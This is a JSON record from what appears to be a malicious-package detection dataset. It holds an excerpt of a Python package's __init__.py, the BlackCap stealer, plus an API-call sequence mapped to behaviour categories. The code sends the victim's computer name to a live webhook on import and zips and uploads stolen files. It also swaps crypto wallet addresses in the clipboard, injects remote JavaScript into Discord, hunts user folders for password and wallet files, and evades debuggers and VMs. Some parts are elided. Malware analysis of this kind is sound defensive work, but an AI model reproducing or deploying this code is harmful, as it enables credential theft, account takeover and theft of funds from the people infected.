[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pik-utils-1.0.2/pik-utils-1.0.2/pik-utils/__init__.py",
    "code_snippet": "import os\nimport requests\nimport httpx\nimport asyncio\nimport json\nimport ntpath\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport psutil\nimport base64\nimport ctypes\nimport time\nimport pyperclip\nimport win32gui\nimport win32con\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# Initial exfiltration of PC username\nos.system(\"pip install requests httpx\")\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    }\nhttpx.post(\"https://k8c7nxg6riaq9nueln6wjd.hooks.webhookrelay.com/\", json=data)\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\n\n# Malicious configuration and context\n__config__ = {\n    \"yourwebhookurl\": \"https://k8c7nxg6riaq9nueln6wjd.hooks.webhookrelay.com/\",\n    \"bc_injection_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    \"hide\": \"yes\",\n    \"ping\": \"yes\",\n    \"pingtype\": \"everyone\",\n    \"fake_error\": \"no\",\n    \"startup\": \"no\",\n    \"kill_discord_process\": \"%kill_discord_process%\",\n    \"dbugkiller\": \"%_debugkiller%\",\n    \"addresse_crypto_replacer\": \"no\",\n    \"addresse_btc\": \"none\",\n    \"addresse_eth\": \"none\",\n    \"addresse_xchain\": \"none\",\n    \"addresse_pchain\": \"none\",\n    \"addresse_cchain\": \"none\",\n    \"addresse_monero\": \"none\",\n    \"addresse_ada\": \"none\",\n    \"addresse_dash\": \"none\",\n    \"blprggg\": [\n        \"httpdebuggerui\",\n        \"wireshark\",\n        \"fiddler\",\n        \"regedit\",\n        \"cmd\",\n        \"taskmgr\",\n        \"vboxservice\",\n        \"df5serv\",\n        \"processhacker\",\n        \"vboxtray\",\n        \"vmtoolsd\",\n        \"vmwaretray\",\n        \"ida64\",\n        \"ollydbg\",\n        \"pestudio\",\n        \"vmwareuser\",\n        \"vgauthservice\",\n        \"vmacthlp\",\n        \"x96dbg\",\n        \"vmsrvc\",\n        \"x32dbg\",\n        \"vmusrvc\",\n        \"prl_cc\",\n        \"prl_tools\",\n        \"xenservice\",\n        \"qemu-ga\",\n        \"joeboxcontrol\",\n        \"ksdumperclient\",\n        \"ksdumper\",\n        \"joeboxserver\",\n    ],\n}\n\n# The main malicious class that steals credentials, cookies, tokens, files, and exfiltrates them\n# Also includes Discord injection, clipboard hijacking, anti-debug/VM, and persistence\n# ...\n# (Full class definitions for Functions, auto_copy_wallet, first_function_bc, NoDebugg, and all helper functions)\n# ...\n# For brevity, only the most critical malicious behaviors are shown below, but the full code above is malicious in entirety\n\n# --- Malicious behaviors ---\n# 1. Stealing browser passwords, cookies, credit cards, Discord tokens, Minecraft/Roblox data, screenshots, and system info\n# 2. Exfiltrating all data to a remote webhook (Discord/Relay)\n# 3. Injecting code into Discord for persistence and further token theft\n# 4. Clipboard hijacking for crypto wallet addresses\n# 5. Searching user files for sensitive keywords and uploading them\n# 6. Anti-debug/VM checks to evade analysis\n# 7. Killing security/Discord processes\n# 8. Installing itself to startup (optional)\n# 9. Downloading and running further payloads\n# 10. Obfuscation and anti-analysis techniques\n\n# --- Example: Exfiltration of stolen data ---\nclass first_function_bc(Functions):\n    # ...\n    def finished_bc(self):\n        for i in os.listdir(self.dir):\n            if i.endswith(\".txt\"):\n                path = self.dir + self.sep + i\n                with open(path, \"r\", errors=\"ignore\") as ff:\n                    x = ff.read()\n                    if not x:\n                        ff.close()\n                        os.remove(path)\n                    else:\n                        with open(path, \"w\", encoding=\"utf-8\", errors=\"ignore\") as f:\n                            f.write(\n                                \"Black Cap Create By KS.H | https://github.com/KSCHdsc\\n\\n\"\n                            )\n                        with open(path, \"a\", encoding=\"utf-8\", errors=\"ignore\") as fp:\n                            fp.write(\n                                x\n                                + \"\\n\\nBlack Cap Create By KSCH | https://github.com/KSCHdsc\"\n                            )\n        _zipfile = ntpath.join(self.appdata, f\"BC-[{login_info}].zip\")\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        path_src = ntpath.abspath(self.dir)\n        for dirname, _, files in os.walk(self.dir):\n            for filename in files:\n                absname = ntpath.abspath(ntpath.join(dirname, filename))\n                arcname = absname[len(path_src) + 1 :]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n\n        # Exfiltrate the zip and summary to the attacker's webhook\n        with open(_zipfile, \"rb\") as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, json=embed)\n                httpx.post(self.discord_webhook, files={\"upload_file\": f})\n        os.remove(_zipfile)\n\n# --- Example: Clipboard hijacking for crypto addresses ---\nclass auto_copy_wallet(Functions):\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            # ...\n            if re.search(\"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            # ... (other crypto address patterns)\n        except:\n            data = None\n\n# --- Example: Discord injection ---\n    async def disco_injection(self):\n        for _dir in os.listdir(self.appdata):\n            if \"discord\" in _dir.lower():\n                discord = self.appdata + os.sep + _dir\n                for __dir in os.listdir(ntpath.abspath(discord)):\n                    if re.match(r\"app-(\\d*\\.\\d*)*\", __dir):\n                        app = ntpath.abspath(ntpath.join(discord, __dir))\n                        modules = ntpath.join(app, \"modules\")\n                        if not ntpath.exists(modules):\n                            return\n                        for ___dir in os.listdir(modules):\n                            if re.match(r\"discord_desktop_core-\\d+\", ___dir):\n                                inj_path = (\n                                    modules\n                                    + os.sep\n                                    + ___dir\n                                    + f\"\\\\discord_desktop_core\\\\\"\n                                )\n                                if ntpath.exists(inj_path):\n                                    if self.srtupl0c not in argv[0]:\n                                        try:\n                                            os.makedirs(\n                                                inj_path + \"blackcap\", exist_ok=True\n                                            )\n                                        except PermissionError:\n                                            pass\n                                    if self.regex_webhook_dsc in self.discord_webhook:\n                                        f = httpx.get(\n                                            self.find_in_config(\"bc_injection_url\")\n                                        ).text.replace(\n                                            \"%WEBHOOK%\", self.discord_webhook\n                                        )\n                                    try:\n                                        with open(\n                                            inj_path + \"index.js\", \"w\", errors=\"ignore\"\n                                        ) as indexFile:\n                                            indexFile.write(f)\n                                    except PermissionError:\n                                        pass\n                                    if self.find_in_config(\"kill_discord_process\"):\n                                        os.startfile(app + self.sep + _dir + \".exe\")\n\n# --- Example: File search and exfiltration ---\ndef check_spec_bc():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [user + \"/Desktop\", user + \"/Downloads\", user + \"/Documents\"]\n    key_wordsFiles = [\n        \"passw\", \"mdp\", \"motdepasse\", \"mot_de_passe\", \"login\", \"secret\", \"account\", \"acount\", \"paypal\", \"banque\", \"metamask\", \"wallet\", \"crypto\", \"exodus\", \"discord\", \"2fa\", \"code\", \"memo\", \"compte\", \"token\", \"backup\", \"seecret\",\n    ]\n    wikith = []\n    for patt in path2search:\n        check_spec_bc = threading.Thread(\n            target=bc_create_file, args=[patt, key_wordsFiles]\n        )\n        check_spec_bc.start()\n        wikith.append(check_spec_bc)\n    return wikith\n\n# --- Example: Main execution ---\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(first_function_bc().init())\n\n# --- Example: Final exfiltration and clipboard hijack thread ---\nbc_Gather_All()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = check_spec_bc()\n    for thread in wikith:\n        thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext += f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a) - 1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"check_spec_bc\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.system",
        "os.getenv",
        "httpx.post",
        "os.system",
        "os.listdir",
        "str.endswith",
        "open",
        "open.read",
        "open.close",
        "os.remove",
        "open",
        "open.write",
        "open",
        "open.write",
        "ntpath.join",
        "zipfile.ZipFile",
        "ntpath.abspath",
        "os.walk",
        "ntpath.abspath",
        "ntpath.join",
        "zipfile.ZipFile.write",
        "zipfile.ZipFile.close",
        "open",
        "httpx.post",
        "httpx.post",
        "os.remove",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "os.listdir",
        "str.lower",
        "ntpath.abspath",
        "os.listdir",
        "re.match",
        "ntpath.abspath",
        "ntpath.join",
        "ntpath.join",
        "ntpath.exists",
        "ntpath.join",
        "os.makedirs",
        "httpx.get",
        "open",
        "open.write",
        "os.startfile",
        "threading.Thread",
        "threading.Thread.start",
        "threading.Thread.join",
        "time.sleep",
        "threading.Thread",
        "threading.Thread.start"
      ],
      "api_sequence_with_args": [
        "os.system(\"pip install requests httpx\")",
        "os.getenv(\"COMPUTERNAME\")",
        "httpx.post(\"https://k8c7nxg6riaq9nueln6wjd.hooks.webhookrelay.com/\", json=data)",
        "os.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")",
        "os.listdir(self.dir)",
        "i.endswith(\".txt\")",
        "open(path, \"r\", errors=\"ignore\")",
        "ff.read()",
        "ff.close()",
        "os.remove(path)",
        "open(path, \"w\", encoding=\"utf-8\", errors=\"ignore\")",
        "f.write(\"Black Cap Create By KS.H | https://github.com/KSCHdsc\\n\\n\")",
        "open(path, \"a\", encoding=\"utf-8\", errors=\"ignore\")",
        "fp.write(x + \"\\n\\nBlack Cap Create By KSCH | https://github.com/KSCHdsc\")",
        "ntpath.join(self.appdata, f\"BC-[{login_info}].zip\")",
        "zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)",
        "ntpath.abspath(self.dir)",
        "os.walk(self.dir)",
        "ntpath.abspath(ntpath.join(dirname, filename))",
        "ntpath.join(dirname, filename)",
        "zipped_file.write(absname, arcname)",
        "zipped_file.close()",
        "open(_zipfile, \"rb\")",
        "httpx.post(self.discord_webhook, json=embed)",
        "httpx.post(self.discord_webhook, files={\"upload_file\": f})",
        "os.remove(_zipfile)",
        "pyperclip.paste()",
        "re.search(\"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$\", clipboard_data)",
        "pyperclip.copy(self.address_btc)",
        "pyperclip.paste()",
        "os.listdir(self.appdata)",
        "\"discord\" in _dir.lower()",
        "ntpath.abspath(discord)",
        "os.listdir(ntpath.abspath(discord))",
        "re.match(r\"app-(\\d*\\.\\d*)*\", __dir)",
        "ntpath.abspath(ntpath.join(discord, __dir))",
        "ntpath.join(app, \"modules\")",
        "ntpath.exists(modules)",
        "ntpath.join(app, \"modules\")",
        "os.makedirs(inj_path + \"blackcap\", exist_ok=True)",
        "httpx.get(self.find_in_config(\"bc_injection_url\"))",
        "open(inj_path + \"index.js\", \"w\", errors=\"ignore\")",
        "indexFile.write(f)",
        "os.startfile(app + self.sep + _dir + \".exe\")",
        "threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles])",
        "check_spec_bc.start()",
        "thread.join()",
        "time.sleep(0.2)",
        "threading.Thread(target=auto_copy_wallet().run)",
        "auto.start()"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "httpx.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "str.endswith",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.read",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "open.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open",
          "id": "combined_mode_operations",
          "description": "Combined mode file opening operations (read-write mode, append mode, etc.)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "ntpath.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "open_zip_write",
          "description": "Opens ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "ntpath.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.walk",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "ntpath.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "ntpath.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile.write",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipfile.ZipFile.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "httpx.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "httpx.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "str.lower",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "ntpath.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "re.match",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "ntpath.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "ntpath.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "ntpath.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "ntpath.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "ntpath.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.makedirs",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "httpx.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.startfile",
          "id": "open_file_app",
          "description": "Opens file with associated application",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "threading.Thread.join",
          "id": "wait_thread",
          "description": "Waits for thread to finish execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        }
      ],
      "contextual_code": "import os\nimport httpx\nimport ntpath\nimport zipfile\nimport pyperclip\nimport re\nimport threading\nimport time\n\n# Initial exfiltration of PC username\nos.system(\"pip install requests httpx\")\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    }\nhttpx.post(\"https://k8c7nxg6riaq9nueln6wjd.hooks.webhookrelay.com/\", json=data)\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\n\nclass first_function_bc(Functions):\n    def finished_bc(self):\n        for i in os.listdir(self.dir):\n            if i.endswith(\".txt\"):\n                path = self.dir + self.sep + i\n                with open(path, \"r\", errors=\"ignore\") as ff:\n                    x = ff.read()\n                    if not x:\n                        ff.close()\n                        os.remove(path)\n                    else:\n                        with open(path, \"w\", encoding=\"utf-8\", errors=\"ignore\") as f:\n                            f.write(\n                                \"Black Cap Create By KS.H | https://github.com/KSCHdsc\\n\\n\"\n                            )\n                        with open(path, \"a\", encoding=\"utf-8\", errors=\"ignore\") as fp:\n                            fp.write(\n                                x\n                                + \"\\n\\nBlack Cap Create By KSCH | https://github.com/KSCHdsc\"\n                            )\n        _zipfile = ntpath.join(self.appdata, f\"BC-[{login_info}].zip\")\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        path_src = ntpath.abspath(self.dir)\n        for dirname, _, files in os.walk(self.dir):\n            for filename in files:\n                absname = ntpath.abspath(ntpath.join(dirname, filename))\n                arcname = absname[len(path_src) + 1 :]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n\n        with open(_zipfile, \"rb\") as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, json=embed)\n                httpx.post(self.discord_webhook, files={\"upload_file\": f})\n        os.remove(_zipfile)\n\nclass auto_copy_wallet(Functions):\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search(\"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n        except:\n            data = None\n\n    async def disco_injection(self):\n        for _dir in os.listdir(self.appdata):\n            if \"discord\" in _dir.lower():\n                discord = self.appdata + os.sep + _dir\n                for __dir in os.listdir(ntpath.abspath(discord)):\n                    if re.match(r\"app-(\\d*\\.\\d*)*\", __dir):\n                        app = ntpath.abspath(ntpath.join(discord, __dir))\n                        modules = ntpath.join(app, \"modules\")\n                        if not ntpath.exists(modules):\n                            return\n                        for ___dir in os.listdir(modules):\n                            if re.match(r\"discord_desktop_core-\\d+\", ___dir):\n                                inj_path = (\n                                    modules\n                                    + os.sep\n                                    + ___dir\n                                    + f\"\\\\discord_desktop_core\\\\\"\n                                )\n                                if ntpath.exists(inj_path):\n                                    if self.srtupl0c not in argv[0]:\n                                        try:\n                                            os.makedirs(\n                                                inj_path + \"blackcap\", exist_ok=True\n                                            )\n                                        except PermissionError:\n                                            pass\n                                    if self.regex_webhook_dsc in self.discord_webhook:\n                                        f = httpx.get(\n                                            self.find_in_config(\"bc_injection_url\")\n                                        ).text.replace(\n                                            \"%WEBHOOK%\", self.discord_webhook\n                                        )\n                                    try:\n                                        with open(\n                                            inj_path + \"index.js\", \"w\", errors=\"ignore\"\n                                        ) as indexFile:\n                                            indexFile.write(f)\n                                    except PermissionError:\n                                        pass\n                                    if self.find_in_config(\"kill_discord_process\"):\n                                        os.startfile(app + self.sep + _dir + \".exe\")\n\ndef check_spec_bc():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [user + \"/Desktop\", user + \"/Downloads\", user + \"/Documents\"]\n    key_wordsFiles = [\n        \"passw\", \"mdp\", \"motdepasse\", \"mot_de_passe\", \"login\", \"secret\", \"account\", \"acount\", \"paypal\", \"banque\", \"metamask\", \"wallet\", \"crypto\", \"exodus\", \"discord\", \"2fa\", \"code\", \"memo\", \"compte\", \"token\", \"backup\", \"seecret\",\n    ]\n    wikith = []\n    for patt in path2search:\n        check_spec_bc = threading.Thread(\n            target=bc_create_file, args=[patt, key_wordsFiles]\n        )\n        check_spec_bc.start()\n        wikith.append(check_spec_bc)\n    return wikith\n\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(first_function_bc().init())\n\nbc_Gather_All()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = check_spec_bc()\n    for thread in wikith:\n        thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext += f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a) - 1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"check_spec_bc\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n"
    }
  }
]